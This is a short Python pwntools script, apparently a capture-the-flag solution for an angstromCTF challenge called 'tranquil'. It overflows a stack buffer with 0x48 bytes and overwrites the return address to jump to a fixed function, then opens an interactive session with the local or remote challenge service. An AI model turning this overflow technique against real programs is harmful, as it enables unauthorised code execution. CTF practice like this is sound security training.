#!/usr/bin/python3

from pwn import *
import sys

if len(sys.argv) > 1:
    r = remote('shell.actf.co', 21830)
else:
    r = process('./tranquil')

r.sendline(b'A'*0x48 + p64(0x401196))
r.interactive()

